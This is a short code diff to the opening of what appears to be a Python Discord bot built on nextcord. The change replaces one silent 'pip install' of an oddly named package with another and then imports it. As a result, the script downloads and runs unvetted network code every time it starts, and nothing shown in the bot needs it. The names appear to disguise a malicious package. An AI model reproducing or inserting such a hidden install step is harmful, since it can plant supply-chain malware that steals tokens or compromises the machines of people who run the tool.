@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syssqlitedbpackageV1")
-import syssqlitedbpackageV1
+os.system("pip install pipcolouringskitsV1")
+import pipcolouringskitsV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
